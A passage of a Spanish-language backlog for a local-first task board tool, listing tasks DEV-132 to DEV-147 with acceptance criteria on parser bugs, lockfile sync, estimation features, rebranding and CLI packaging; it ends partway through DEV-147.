**Goal redacto para Sprint 7**, derivado de lo que el sprint efectivamente es hoy
(12 tareas, 4 en `ready`, 5 en `review`, 2 en `draft`):

> Integridad del dato y corrección de fallos silenciosos: hooks de verificación que
> no mutan el repositorio, paridad de temas, identidad de proyecto, y eliminación
> de los defectos que no fallaban de forma visible (contenido fabricado en los
> `.md`, stacking context y containing block en overlays, y pulido de ItemModal).

El eje común que unifica las 12 tareas es precisamente ese: **ninguno de esos
defectos fallaba de forma visible**. El serializador no fallaba, escribía texto de
más. El Plan Guard no fallaba, no se disparaba nunca. El menú no fallaba, se
tapaba. El `ConfirmModal` no fallaba, se dibujaba en el lugar equivocado y
parpadeaba. Son fallos silenciosos, y esa es la línea que justifica el sprint.

**Ampliación de alcance.** Con el goal definido, el usuario señaló además tareas de bajo
esfuerzo y alto valor que ya existían en el backlog sin asignar. Se incorporan
**DEV-118, DEV-119, DEV-120, DEV-121 y DEV-122** al Sprint 7. **DEV-115 y DEV-101**
ya pertenecían al sprint, por lo que no se reassignan.

**Defecto de formato corregido en DEV-101**: su Implementation Plan tenía los
saltos de línea como la secuencia literal `\n` en vez de saltos reales, lo que se
renderiza como un solo bloque corrido en la UI. Corregido.

**Criterios de Aceptación:**
- [x] #1 Se verifica si el goal vacío de Sprint 7 es un defecto puntual o una costumbre del proyecto, auditando el campo `goal` de los 8 sprints
- [x] #2 Sprint 7 recibe un `goal` que describe su alcance real, en `backlog/sprints.json`
- [x] #3 DEV-118 queda asignada a Sprint 7
- [x] #4 DEV-119 queda asignada a Sprint 7
- [x] #5 DEV-120 queda asignada a Sprint 7
- [x] #6 DEV-121 queda asignada a Sprint 7
- [x] #7 DEV-122 queda asignada a Sprint 7
- [x] #8 DEV-115 y DEV-101 se verifican como ya pertenecientes al sprint (no se reasignan)
- [x] #9 Se revisa la definición de DEV-101 y se corrige el defecto de formato de su plan (saltos de línea literales `\n`)
- [x] #10 Se registra el riesgo de DEV-119 (reescritura de historial git) antes de ejecutarla: es irreversible y afecta a todo el repo
- [x] #11 `npm run backlog:check` finishes con código 0
- [x] #12 Se incorpora en `AGENTS.md` el gate de cierre de sprint: no se cierra con tareas en `draft`, `doing` o `review`, y el agente no debe proponer ni anticipar el cierre de un sprint incompleto
- [x] #13 Se fija el ritmo de trabajo: resolver las tareas de a una y pasar a la siguiente sólo con la confirmación del usuario de que la anterior quedó bien

---

#### [DEV-132] El Parser No Detecta Marcadores de Sección Literales en Descripciones y Falla en Silencio
- **Prioridad**: `high` | **Tipo**: `bug`

El parser de archivos de tarea extrae las secciones delimitadas tomando la
**primera coincidencia** de cada marcador, en orden de documento. Consecuencia: si
la descripción de una tarea contiene los marcadores literales del formato - algo
perfectamente natural en una tarea que **documenta el propio formato** - el parser
lee esa copia como si fuera la sección real, y la tarea se parsea con datos
equivocados, **sin ningún error visible**.

**Caso real, encontrado en el propio backlog**: la descripción de DEV-127 incluye,
para mostrar un `.md` contaminado, un bloque de código con los marcadores literales
de sección. Como la descripción va antes que las secciones reales, el regex de
extracción capturaba desde el `AC:BEGIN` de la descripción hasta el `AC:END` real,
es decir medio documento. Los **18 ACs de DEV-127 eran invisibles para el parser**.

**El agravante: el guard de integridad no lo puede detectar.** `npm run
backlog:check` lee y escribe con el mismo parser. Si el parser interpreta
consistentemente el bloque equivocado, la relectura produce el mismo error y el
guard reporta "100% sincronizado". Un error autoconsistente se valida como
verdadero, que es la peor clase de fallo en una herramienta cuyo propósito es
justamente dar confianza sobre el estado del backlog.

**Por qué importa más de lo que parece**: la serie DEV-101 a DEV-131 es,
precisamente, la que documenta y modifica el formato de los archivos de tarea
(serialización, secciones, plan guard, campos, sanitización). Es un tipo de tarea
que va a seguir apareciendo en cada iteración del producto, y todas ellas corren
riesgo de caer en esta trampa. Cuantas más tareas documenten el formato, mayor es
la probabilidad de que una corrompa silenciosamente su propia lectura.

**Mitigación parcial ya aplicada**: en DEV-127 los marcadores del ejemplo se
reescribieron como texto neutro (`[marcador AC:BEGIN]`) en lugar de su forma
literal. Eso corrige **ese** archivo, pero no previene el próximo.

**Criterios de Aceptación:**
- [x] #1 Se agrega al guard de integridad (`npm run backlog:check`) un detector que falle de forma explícita cuando un archivo de tarea contiene más de un marcador `BEGIN` por sección, en lugar de dejar que el error pase inadvertido
- [x] #2 El detector reporta el archivo, la línea y el marcador duplicado, para que el autor pueda localizarlo sin buscar a ciegas
- [x] #3 El detector no produce falsos positivos: los archivos legítimos con secciones adicionales como `SECTION:TECHNOTES` se validan sin error
- [x] #4 El write path deja de propagar el problema: al serializar, los marcadores que aparezcan literalmente dentro de texto libre del usuario se neutralizan o se escapan
- [x] #5 El write path nunca altera los marcadores reales de la estructura del archivo
- [x] #6 Una tarea cuya descripción contenga los marcadores literales se relee con sus ACs, plan y descripción reales, y no con los de la descripción
- [x] #7 Se agrega un test de regresión en `scripts/test-parser.js` que construya una tarea con marcadores literales en la descripción y verifique que el round-trip conserva los ACs y el plan reales
- [x] #8 El test cubre también el caso de un marcador literal en el plan y en las notas técnicas
- [x] #9 `npx tsc --noEmit` finishes con código 0
- [x] #10 `npm test` finishes con código 0
- [x] #11 `npm run backlog:check` finishes con código 0
- [x] #12 Se documenta en `AGENTS.md` la prohibición de escribir marcadores de sección literales dentro de descripciones, y el motivo

---

#### [DEV-133] package-lock.json Desincronizado en 0.1.0: el Lockfile No se Regenera desde el 16/09
- **Prioridad**: `low` | **Tipo**: `bug`

`package-lock.json` declara `"version": "0.1.0"` mientras `package.json` declara
`"version": "0.6.1"`. El lockfile **no se regenera desde el 16/09/2026**, cuando el
proyecto atravesó las versiones 0.2.0, 0.3.0, 0.4.0, 0.5.0, 0.6.0 y 0.6.1.

**Cómo se detectó**: al buscar por qué `releases.json` no tenía entrada para
`0.1.0`, la única referencia a esa versión en todo el repositorio apareció en el
lockfile. La evidencia de que `0.1.0` fue un bump real pero informal: los commits
`e0029b7` y `ed91943` (ambos del 16/09) tienen `version=0.1.0` en `package.json`,
y horas después `f4ce6ae` ya sube a `0.2.0`. No hay tag `v0.1.0` - el más antiguo
es `v0.2.0` - ni entrada en `releases.json` ni tarea asignada a esa versión.

**Por qué importa, aunque no rompa nada hoy**: npm reconcilia el desfase en el
momento de instalar, así que el proyecto funciona. El problema es de higiene del
repositorio y de trazabilidad: es un dato que afirma una versión que no existe
como release, en un archivo versionado que cualquier agente o persona puede leer
como si fuera verdad. Es exactamente la clase de dato desincronizado que este
sprint viene limpiando (DEV-127 eliminó contenido fabricado de los `.md`).

Un segundo problema Observable: el lockfile congelado implica que las
dependencias transitivas instaladas pueden no coincidir con las que se resuelven
hoy, y la diferencia no queda registrada en el historial.

**Criterios de Aceptación:**
- [x] #1 `package-lock.json` declara una `version` igual a la de `package.json`
- [x] #2 El lockfile se regenera con `npm install`, actualizando el árbol de dependencias transitivas
- [x] #3 Se verifica que `npm ci` funciona con el lockfile regenerado
- [x] #4 Se verifica que `npm run build` sigue funcionando tras la regeneración
- [x] #5 Se documenta en el plan el criterio para futuras promociones de versión: subir `package.json` y regenerar el lockfile en el mismo commit, para que la desincronización no vuelva a ocurrir
- [x] #6 `npm test` finishes con código 0
- [x] #7 `npm run backlog:check` finishes con código 0
- [x] #8 La regeneración resultó quirúrgica: **únicamente** cambió el campo `version` del root (0.1.0 → 0.6.1). Cero cambios en las 185 entradas del árbol y cero paquetes agregados o eliminados, lo que confirma que la única desincronización era el campo de versión
- [x] #9 Se verifica el árbol de dependencias de forma explícita: las 12 dependencias declaradas (uniendo `dependencies` y `devDependencies`) coinciden en nombre con las del root del lockfile, sin faltantes ni sobrantes
- [x] #10 `npx tsc --noEmit` finishes con código 0

---

#### [DEV-134] El Serializador No Canonicaliza el Estado en el Frontmatter: Done/Done vs done/done Acumulados
- **Prioridad**: `low` | **Tipo**: `chore`

El frontmatter de las tareas escribe el estado **tal como viene**, sin
canonicalizarlo. Como el read path sí normaliza (`normalizeStatus` mapea `Done` a
`done`, `Draft` a `draft`), el sistema funciona, pero el dato persistido queda
inconsistente para siempre.

**Estado real de los 132 archivos de `backlog/tasks/`:**

| Valor escrito | Cantidad |
|---|---|
| `Done` (mayúscula) | 93 |
| `Draft` (mayúscula) | 3 |
| `done` (minúscula) | 12 |
| `draft` (minúscula) | 10 |
| `ready` | 8 |
| `review` | 6 |

Es decir, **96 de 132 tareas (73%) tienen el estado con mayúscula inicial**, y
esas 96 son exactamente las más antiguas: el proyecto empezó escribiéndose a mano
con `Done` y `Draft`, y desde que `normalizeStatus` existe el write path no
corrige lo que ya quedó.

**Por qué no rompe nada**: `normalizeStatus` se aplica al leer, así que la UI y
el MCP ven `done` correctamente. El costo es de higiene del dato versionado, y
crece: cada guardado reescribe el archivo con el valor que venga, de modo que la
divergencia se congela en vez de resolverse.

**Mismo patrón que DEV-127, otra dimensión**: DEV-127 eliminó que el serializador
fabricara contenido que el usuario nunca escribió. Acá no fabrica, pero tampoco
**normaliza**: escribe un valor no canónico. En ambos casos el write path debería
garantizar que lo que llega al disco es la forma canónica del modelo.

**Consecuencia práctica más grave que la estética**: cualquier herramienta que lea
el frontmatter de forma directa sin pasar por el parser ve dos valores distintos
para el mismo estado. Un `grep '^status: done'` sobre los archivos devuelve 12
resultados de 105 tareas completadas.

**Criterios de Aceptación:**
- [x] #1 `serializeBacklogMd` escribe el estado usando la forma canónica en minúscula, independientemente de cómo llegue en el objeto de entrada
- [x] #2 Verificar con un round-trip que una tarea creada con `status: "Done"` se persiste como `status: "done"` y se relee como `done`
- [x] #3 Se agrega un test de regresión en `scripts/test-parser.js` que cubra las variantes con mayúscula inicial (`Done`, `Draft`, `In Progress`, `Ready`, `Testing`, `Review`)
- [x] #4 Se normalizan los 96 archivos existentes que tienen el estado con mayúscula, sin alterar su contenido más allá del campo `status`
- [x] #5 La normalización preserva cualquier otro campo del frontmatter, incluidos los no canónicos (`labels`, `assignees`) y los nombres de sección
- [x] #6 Se documenta en el plan el criterio: en el write path, todo campo del modelo que tenga forma canónica se escribe en forma canónica, nunca "tal como vino"
- [x] #7 `npx tsc --noEmit` finishes con código 0
- [x] #8 `npm test` finishes con código 0
- [x] #9 `npm run backlog:check` finishes con código 0

---

#### [DEV-135] El Motor de Importación está Hardcodeado a un Proyecto Privado: Genericizar import-docs.js
- **Prioridad**: `high` | **Tipo**: `bug`

El motor de importación de documentación - `runMigration` en
`scripts/import-docs.js`, invocado por el endpoint de importación del dev
server en `vite.config.ts:2324` y `:2353` - está **hardcodeado a un proyecto de
finanzas personales concreto**. No es un script personal descartable: es código de
producto con un supuesto privado incrustado.

**Elementos hardcodeados, tras la sanitización de rutas de DEV-118:**

| Línea | Contenido |
|---|---|
| `scripts/import-docs.js:78-84` | `name: '<Private Project>'`, `codePrefix: '<PREFIX>'`, `description` de finanzas personales |
| `scripts/import-docs.js:159` | `const code = \`<PREFIX>-${rawId}\`` |
| `scripts/import-docs.js:279` | `code: \`<PREFIX>-${rawId}\`` |
| `scripts/import-docs.js:319,322` | `let code = \`<PREFIX>-${...}\`` y `<PREFIX>-SPEC-${n}` |

Además, el **nombre del archivo y el script de npm** heredan el supuesto:
`import-docs.js` y `"import:docs": "node scripts/import-docs.js"`.

**Por qué importa más allá de la privacidad**: cualquier proyecto importado por
otro usuario recibe identificadores con prefijo hardcodeado, que colisionan con el
prefijo real del proyecto y con el de cualquier otro. El `codePrefix` que el
proyecto declara se ignora por completo en la generación de códigos.

**Lo que hace el refactor viable**: `runMigration` ya recibe `projectMeta` y lo usa
para asignar `item.projectId`. Sólo hay que extender ese mismo objeto a la
generación de códigos y eliminar el objeto de proyecto embebido.

**Lo que ya se corrigió en DEV-118 y no hay que repetir**: la ruta absoluta
personal (`<DOCS_DIR>` con valor por defecto embebido) y el objeto `projectMeta`
de respaldo. Ahora ambos se exigen en vez de inventarse.

**Criterios de Aceptación:**
- [x] #1 La generación de códigos usa `projectMeta.codePrefix` en lugar de un literal hardcodeado, en los cuatro sitios de `import-docs.js`
- [x] #2 Un proyecto sin `codePrefix` falla de forma explícita antes de importar, en lugar de generar códigos sin prefijo
- [x] #3 El script se renombra a un nombre sin supuesto privado (`scripts/import-docs.js`) y se actualizan el import en `vite.config.ts` y el script de npm
- [x] #4 Ninguna cadena del módulo contiene identificadores hardcodeados ni descripciones de proyectos privados. El único prefijo restante es el recibido por configuración
- [x] #5 El script de npm deja de exponer el supuesto: `import:dom` pasa a `import:docs`
- [x] #6 El contexto (`codePrefix` + `projectId`) se resuelve **una sola vez** en el entrypoint y se propaga a los cuatro parsers, en lugar de pasar el prefijo suelto en cada llamada
- [x] #7 El `.d.ts` del módulo se renombra junto con el archivo y se tipa en lugar de usar `any`: define `ImportProjectMeta` con `codePrefix` obligatorio
- [x] #8 Se agrega un test de regresión en `scripts/test-parser.js` que falla si el módulo vuelve a incrustar un proyecto o un prefijo privado hardcodeado, o si alguno de los cuatro parsers deja de recibir el contexto
- [x] #9 `npx tsc --noEmit` finishes con código 0
- [x] #10 `npm test` finishes con código 0
- [x] #11 `npm run build` finishes con código 0
- [x] #12 `npm run backlog:check` finishes con código 0
- [x] #13 `npm run audit:ux` sigue con 0 errores y 0 advertencias
- [x] #14 Las referencias al nombre viejo (`import-dom-docs.js`, `import:dom`) se actualizan en todos los archivos rastreados, incluidas las descripciones de DEV-118 y DEV-135, y `BACKLOG.md` se regenera

---

#### [DEV-136] Sistema de Estimación en Settings Activación Selector Fibonacci vs Tshirt y Configuración Persistente
- **Prioridad**: `high` | **Tipo**: `feature`

Proveer en DevBoard la capacidad de configurar el sistema de estimación de tareas a nivel de proyecto desde la vista de Configuración (SettingsView).

### Requerimientos Clave:
1. **Activación / Desactivación Soberana:** El usuario debe poder activar o desactivar la estimación de ítems mediante un toggle principal en Settings.
2. **Selección de Método de Estimación:** Cuando la estimación está activa, el usuario puede elegir entre dos metodologías canónicas de la industria:
   - **Story Points (Fibonacci):** Escala numérica estándar [0, 1, 2, 3, 5, 8, 13, 21].
   - **T-Shirt Sizes:** Escala cualitativa por tallas [XS, S, M, L, XL, XXL].
3. **Previsualización Interactiva:** La UI de configuración debe mostrar una vista previa visual de la escala elegida (pills con badges de colores/estilos del sistema).
4. **Persistencia Reactiva:** La preferencia se almacena en el archivo `.devboard/config.json` dentro del campo `estimation` y se propaga en tiempo real al estado global del cockpit.
5. **No Destructividad:** Desactivar la estimación oculta la funcionalidad en la UI pero preserva los valores asignados previamente en los archivos Markdown locales.

**Criterios de Aceptación:**
- [x] #1 Definir tipos canónicos en src/types.ts: EstimationMethod ('fibonacci' | 'tshirt'), EstimationConfig ({ enabled: boolean, method: EstimationMethod }) y extender DevBoardConfig con estimation?: EstimationConfig
- [x] #2 Inicializar la configuración de estimación con valores seguros por defecto (enabled: false, method: 'fibonacci') para garantizar retrocompatibilidad total
- [x] #3 Crear sección dedicada 'Estimación de Ítems' en src/components/SettingsView.tsx con un switch/toggle accesible e intuitivo para activar o desactivar la funcionalidad
- [x] #4 Implementar selector interactivo de método entre 'Story Points (Fibonacci)' y 'T-Shirt Sizes (Tallas de Remera)' con descripción y previsualización gráfica de las escalas correspondientes
- [x] #5 Persistir los cambios en .devboard/config.json mediante onSaveConfig y sincronizar reactivamente el estado en App.tsx sin recargar la aplicación
- [x] #6 Asegurar preservación de datos no destructiva: si la estimación se desactiva en Settings, las estimaciones existentes en los archivos Markdown no se borran ni modifican
- [x] #7 Soportar reversión limpia de cambios mediante el botón 'Deshacer cambios' de Settings restaurando el estado previo de configuración

---

#### [DEV-137] Persistencia y Modelo de Estimación en Markdown Frontmatter y Soporte MCP
- **Prioridad**: `high` | **Tipo**: `feature`

Incorporar el soporte del atributo de estimación en el motor de almacenamiento de DevBoard, garantizando persistencia soberana en archivos Markdown individuales (backlog/tasks/*.md), el archivo consolidado (BACKLOG.md) y los contratos de herramientas MCP.

### Requerimientos Técnicos:
1. **Modelo de Dominio Tipado:**
   - Añadir `estimate?: string | number;` en `BacklogItem` (`src/types.ts`) y `BacklogMdTask` (`scripts/backlogMdParser.ts`).
   - Normalización de valores: Story Points numéricos (0, 1, 2, 3, 5, 8, 13, 21) o strings de tallas canónicas (XS, S, M, L, XL, XXL).
2. **Parser y Serializador Markdown (backlogMdParser.ts):**
   - Lectura defensiva de `estimate:` en frontmatter YAML.
   - Serialización limpia: si `task.estimate` está definido, escribir `estimate: ${val}` respetando el formato YAML.
   - Preservación en sincronización y regeneración de `BACKLOG.md`.
3. **Contratos API y Middleware (vite.config.ts):**
   - Propagar `estimate` en endpoints de tareas sin descarte de payload.
4. **Herramientas MCP (scripts/mcp-server.ts y bin/devboard-mcp.js):**
   - Permitir asignar o modificar la estimación desde `devboard_create_task` y `devboard_update_task`.
   - Exponer `estimate` en las consultas de `devboard_get_task` y `devboard_list_tasks`.
5. **Idempotencia y Retrocompatibilidad:**
   - Tareas preexistentes sin estimación continúan funcionando sin errores (`estimate: undefined`).

**Criterios de Aceptación:**
- [x] #1 Extender la interfaz BacklogItem en src/types.ts y BacklogMdTask en scripts/backlogMdParser.ts con el campo opcional estimate?: string | number
- [x] #2 El parser parseBacklogMd extrae de forma robusta el atributo estimate del frontmatter YAML tanto para números (Story Points) como para cadenas (T-Shirt sizes)
- [x] #3 El serializador serializeBacklogMd serializa de forma canónica y limpia el campo estimate: en el frontmatter de backlog/tasks/*.md y BACKLOG.md
- [x] #4 Actualizar los endpoints en vite.config.ts (/api/tasks, /api/backlog) para propagar el campo estimate en lecturas y escrituras sin pérdida de atributos
- [x] #5 Extender las herramientas MCP devboard_create_task y devboard_update_task para aceptar y procesar el parámetro estimate de forma nativa
- [x] #6 Exponer el valor de estimate en devboard_get_task y devboard_list_tasks para consumo eficiente por agentes de IA
- [x] #7 Añadir tests de regresión en scripts/test-parser.js verificando parseo, serialización e idempotencia de tareas con y sin estimación

---

#### [DEV-138] Selector de Estimación en ItemModal y Badges Visuales en Tarjetas Kanban
- **Prioridad**: `medium` | **Tipo**: `ux`

Diseñar e implementar la experiencia de usuario (UX) para la asignación y visualización de estimaciones en la interfaz gráfica del cockpit:

### 1. Edición y Asignación en ItemModal (src/components/ItemModal.tsx):
- Visualización condicional: el selector de estimación sólo es visible si `config.estimation?.enabled === true`. Si está desactivado, el campo no se dibuja, manteniendo el modal limpio y sin distracciones.
- Control interactivo moderno:
  - **Modo Story Points (Fibonacci):** Segmented control o fila de botones tipo pill con los valores canónicos [0, 1, 2, 3, 5, 8, 13, 21], destacando con estilo activo el punto seleccionado.
  - **Modo T-Shirt Sizes:** Pills interactivas con las tallas estándar [XS, S, M, L, XL, XXL].
  - Botón o acción de reseteo (`Sin estimar`) para desasignar la estimación de la tarea con un solo click.
- Integración en `populateFromItem` y transmisión en el payload de guardado `onSave`.

### 2. Visualización en Tarjetas Kanban (src/components/ItemCard.tsx):
- Badge discreto y elegante en el pie o encabezado de la tarjeta Kanban.
- Representación contextual:
  - Para Fibonacci: ej. `5 pts` o badge con icono sutil de estimación + número.
  - Para T-Shirt: ej. badge con `M`, `L`, etc. con estilo distintivo.
- Compatibilidad perfecta con Dark Mode y Light Mode (tokens Tailwind existentes en el proyecto).
- Zero Layout Shifts: dimensiones estables para no alterar la altura ni el drag-and-drop de las tarjetas en el tablero.

**Criterios de Aceptación:**
- [x] #1 En ItemModal.tsx, mostrar el campo y control de estimación únicamente si config.estimation?.enabled es true
- [x] #2 Renderizar un selector ergonómico adaptativo según el método configurado: pills/botones para Fibonacci (0, 1, 2, 3, 5, 8, 13, 21) o T-Shirt Sizes (XS, S, M, L, XL, XXL)
- [x] #3 Permitir asignar, cambiar o desasignar (limpiar estimación) con feedback visual inmediato y persistencia en onSave hacia el backend
- [x] #4 En ItemCard.tsx, renderizar un badge compacto de estimación en la tarjeta Kanban únicamente si la estimación está habilitada y el ítem tiene un valor asignado
- [x] #5 Diseñar el badge de ItemCard con tokens semánticos del sistema, excelente contraste en Light y Dark Mode y cero saltos de layout (Zero-CLS)
- [x] #6 Garantizar que al desactivar la estimación desde Settings, los elementos visuales en ItemModal e ItemCard se oculten inmediatamente sin alterar los datos persistidos en disco

---

#### [DEV-139] Métricas Agregadas en SprintView Tabla de Backlog y Filtros por Estimación
- **Prioridad**: `medium` | **Tipo**: `feature`

Incorporar inteligencia analítica ágil y visibilidad consolidada en DevBoard a través de métricas agregadas de estimación en la vista de Sprints (SprintView), vista tabular de Backlog y filtros avanzados:

### 1. Métricas Agregadas en SprintView (src/components/SprintView.tsx):
- **Modo Story Points (Fibonacci):**
  - Conteo total de Story Points del sprint (capacidad comprometida).
  - Story points completados / listos (avance en puntos vs avance en tarjetas).
  - Porcentaje de velocidad/avance ponderado por puntos.
- **Modo T-Shirt Sizes:**
  - Resumen visual de distribución por tallas (ej. `2 XS · 3 S · 5 M · 1 L`).
- Visibilidad condicional: estas métricas solo se renderizan si `config.estimation?.enabled === true`.

### 2. Columna de Estimación en Vista Tabular:
- En la tabla de tareas de Sprints y Backlog, incluir columna "Estimación" que muestre el valor con su formato adecuado (badge compacto).
- Soportar ordenamiento por estimación (numérico para Fibonacci, orden jerárquico canónico XS < S < M < L < XL < XXL para T-Shirt).

### 3. Filtros Avanzados (src/components/FilterBar.tsx y AdvancedFiltersPopover.tsx):
- Permitir filtrar por estimación cuando esté activa.
- Selector multi-talla para T-Shirt sizes o rangos de Story Points.
- Los filtros operan de manera 100% ortogonal respecto a sprint, release, prioridad y tipo.

**Criterios de Aceptación:**
- [x] #1 En SprintView.tsx, calcular y visualizar el rollup de Story Points (puntos totales planificados, puntos completados o en ready, y puntos pendientes) cuando el método es Fibonacci
- [x] #2 En SprintView.tsx, calcular y visualizar el desglose cuantitativo por tallas (ej: 2 XS, 4 M, 1 XL) cuando el método es T-Shirt Sizes
- [x] #3 Agregar columna 'Estimación' en la tabla de tareas de SprintView y vista de Backlog, con capacidad de ordenamiento ascendente y descendente
- [x] #4 Incorporar filtro por estimación en AdvancedFiltersPopover.tsx para filtrar tarjetas por tallas o rangos de Story Points cuando la estimación esté habilitada
- [x] #5 Garantizar recálculo reactivo automático de métricas y totales en tiempo real ante modificaciones de estado o estimación en las tareas
- [x] #6 Respetar el Principio de Ortogonalidad de Dimensiones: las métricas de estimación complementan pero nunca reemplazan ni interfieren con los conteos de tareas por estado ni con las dimensiones de sprint o release

---

#### [DEV-140] Configuración de Linting y Formatting: ESLint Flat Config, Prettier y EditorConfig
- **Prioridad**: `high` | **Tipo**: `feature`

Establecer configuración de linting y formateo homogénea para que contribuidores externos mantengan la consistencia del código. Usar ESLint flat config con soporte TypeScript y React, Prettier para formateo y EditorConfig para editores sin Prettier nativo.

**Criterios de Aceptación:**
- [x] #1 Sincerado en DEV-152: eliminación del stub inerte `eslint.config.js` para evitar falsas garantías; la rigurosidad estricta la provee `npx tsc --noEmit` y el pre-commit hook
- [x] #2 Crear `.prettierrc` con configuración de estilo unificada (singleQuote, semi, trailingComma, printWidth) y `.prettierignore` para excluir dist/, bin/, node_modules/ y archivos markdown de backlog/
- [x] #3 Crear `.editorconfig` con reglas de indentación (2 espacios), UTF-8 y saltos de línea LF
- [x] #4 Scripts `"lint": "tsc --noEmit"` y `"format": "node scripts/verify-backlog-sync.js"` vinculados a las salvaguardas nativas del proyecto
- [x] #5 Verificar que `npm run lint` y `npm run format` se ejecutan correctamente sin romper el build

---

#### [DEV-141] Requisitos de Entorno de Ejecución: .nvmrc, .node-version y Node Engine en package.json
- **Prioridad**: `medium` | **Tipo**: `chore`

Fijar la versión mínima requerida de Node.js mediante archivos estándar (.nvmrc, .node-version), metadato engines en package.json y documentación clara para que cualquier desarrollador clone y ejecute sin fallos por versiones no compatibles.

**Criterios de Aceptación:**
- [x] #1 Crear archivo `.nvmrc` con `22.6.0` (versión requerida para flag `--experimental-strip-types`)
- [x] #2 Crear archivo `.node-version` con `22.6.0` para gestores alternativos (fnm, volta, asdf)
- [x] #3 Verificar que `package.json` incluye `"engines": { "node": ">=22.6.0" }`
- [x] #4 Documentar en CONTRIBUTING.md la versión requerida de Node y el motivo técnico de `--experimental-strip-types`
- [x] #5 Agregar badge de versión mínima de Node en README.md y README.es.md

---

#### [DEV-142] Activos Visuales y Storytelling del README: Hero Screenshot, Galería y Propuesta de Valor
- **Prioridad**: `high` | **Tipo**: `docs`
- **Sprint / Milestone**: 1.0.4

Para una herramienta visual e interactiva como Gripm, la presencia de capturas de alta calidad y un pitch narrativo inmediato es clave para explicar el producto y convertir visitas en adopción. Esta tarea abarca la creación de assets gráficos y la mejora del storytelling en el README bilingüe.

**Criterios de Aceptación:**
- [x] #1 Crear carpeta `docs/screenshots/` para almacenar imágenes y capturas optimizadas del cockpit
- [x] #2 Capturar imágenes del Kanban Board en modo oscuro y claro con tareas sintéticas del proyecto de demostración
- [x] #3 Capturar vistas clave: Sprint Hub con métricas y Release Assembler con changelog generado
- [x] #4 Insertar hero image en la parte superior de README.md y README.es.md con badge de capturas del producto
- [x] #5 Agregar galería bilingüe en ambos READMEs con descripciones concisas
- [x] #6 Fortalecer el storytelling con la propuesta local-first y el mensaje «Tu hoja de ruta no debería vivir en servidores ajenos» / “Your roadmap shouldn't live on someone else's servers.”

---

#### [DEV-143] Investigación y Matriz de Naming para Rebranding: Análisis de Mercado, Storytelling y Disponibilidad
- **Prioridad**: `high` | **Tipo**: `feature`

Llevar a cabo una investigación de mercado profunda de branding e identidad para superar la denominación genérica 'dev-board'. Diseñar una matriz de evaluación exhaustiva analizando storytelling, fonética, resonancia con la visión de cockpit ágil para humanos y agentes IA, y disponibilidad técnica en npm y GitHub.

**Criterios de Aceptación:**
- [x] #1 Auditar patrones lingüísticos y convenciones de marcas líderes (Linear, Plane, Height, Zed, Warp, Cursor, Raycast, Graphite)
- [x] #2 Evaluar exhaustivamente las propuestas pre-seleccionadas (GRIP, AgentBoard) y generar al menos 8 alternativas originales adicionales de alto calibre
- [x] #3 Construir matriz comparativa evaluando: fonética, memorabilidad, storytelling de soberanía/agentes, disponibilidad en npm y colisiones en GitHub
- [x] #4 Desarrollar el storytelling y justificación narrativa profunda para los 3 finalistas más prometedores
- [x] #5 Presentar el informe de naming estructurado al usuario para deliberación y toma de decisión informada

---

#### [DEV-144] Migración Integral de Rebranding: Renombrado de Binarios, Documentación y Alias Retrocompatibles
- **Prioridad**: `high` | **Tipo**: `feature`

Una vez seleccionado y aprobado el nombre definitivo del producto, ejecutar la migración técnica integral de la identidad: package.json, binarios CLI, aliases retrocompatibles, componentes visuales de UI y suite completa de documentación.

**Criterios de Aceptación:**
- [x] #1 Actualizar `package.json` con el nuevo nombre y configurar binarios duales para retrocompatibilidad total (`bin: { "nuevo-nombre": "...", "devboard": "..." }`)
- [x] #2 Actualizar textos de marca, logos y encabezados en la UI (`src/components/Header.tsx`, `SettingsView.tsx`, etc.)
- [x] #3 Actualizar toda la documentación técnica: README.md, README.es.md, AGENTS.md, CONTRIBUTING.md, ARCHITECTURE.md, AGENTIC_PLAYBOOK.md
- [x] #4 Actualizar scripts de scaffolding (`initScaffold.js`), binarios CLI y updateChecker con las nuevas referencias y aliases
- [x] #5 Verificar que `npx tsc --noEmit`, `npm test` y `npm run build` pasan sin errores con el nuevo nombre

---

#### [DEV-145] Apertura Automática del Navegador en npm run dev y npm run board
- **Prioridad**: `high` | **Tipo**: `feature`

Configurar la apertura automática del navegador en localhost:4100 (o el puerto disponible) tanto al ejecutar npm run dev como npm run board, agregando el script board en package.json y configurando server.open en vite.config.ts de forma coordinada con bin/devboard.js.

**Criterios de Aceptación:**
- [x] #1 Agregar script "board": "node bin/devboard.js" en package.json
- [x] #2 Configurar server.open: true en vite.config.ts para apertura automática de localhost:4100 (o puerto resuelto) en npm run dev
- [x] #3 Prevenir apertura duplicada en bin/devboard.js pasando open: false a createServer y preservando el flag --no-open
- [x] #4 Verificar tipado estricto con npx tsc --noEmit, pruebas con npm test y auditoría con npm run backlog:check

---

#### [DEV-146] Desacople Canónico de Sprint vs Release, Gobernanza de Ciclo de Vida y Release v0.7.0
- **Prioridad**: `high` | **Tipo**: `tech_debt`

Desacople canónico de Sprint vs Release, actualización de directivas de gobernanza ágil en AGENTS.md, consolidación del paquete v0.7.0 con 25 tareas completadas, bump de versión y publicación en main de GitHub.

**Criterios de Aceptación:**
- [x] #1 Actualizar AGENTS.md reflejando el desacople conceptual entre Sprint y Release (releases por valor entregado y no atadas al sprint)
- [x] #2 Actualizar AGENTS.md definiendo el ciclo de vida de Sprint por timeboxing y ampliación de alcance sin bloqueos artificiales
- [x] #3 Tildar ACs validados pendientes (#6 en DEV-126 y #10 en DEV-130)
- [x] #4 Registrar la versión formal v0.7.0 en backlog/releases.json con sus release notes y los 25 itemCodes completados
- [x] #5 Promover a status done las tareas incluidas en la release v0.7.0
- [x] #6 Incrementar versión en package.json a 0.7.0
- [x] #7 Actualizar README.md y README.es.md con Features Overview (v0.7.0) y conteo real de tareas dogfooding
- [x] #8 Ejecutar npm run build para regenerar dist/ y binarios ejecutables
- [x] #9 Ejecutar npm test y npm run backlog:check verificando 0 errores
- [x] #10 Comitear, crear tag v0.7.0 y pushear a origin/main con tags en GitHub

---

#### [DEV-147] Empaquetado y Distribución CLI: Servidor de Producción, Dependencias Runtime y Smoke Test de npm pack
- **Prioridad**: `urgent` | **Tipo**: `bug`

Resolver el crash crítico detectado en auditoría externa al instalar `gripm` como paquete npm global o ejecutarlo con `npx gripm`.
Actualmente `package.json` incluye en `files` únicamente `bin/`, `dist/`, `data/demo-backlog.json` y READMEs, omitiendo `scripts/` y `vite.config.ts`, mientras `bin/gripm.js` intenta importar `../scripts/*.js` y levantar el servidor dev de Vite con `dependencies` completamente vacío.

Esta tarea aborda:
1. Asegurar que `bin/gripm.js` cuente con todos los scripts necesarios o un servidor Node de producción autónomo que sirva `dist/` y el API sin depender del servidor de desarrollo de Vite.
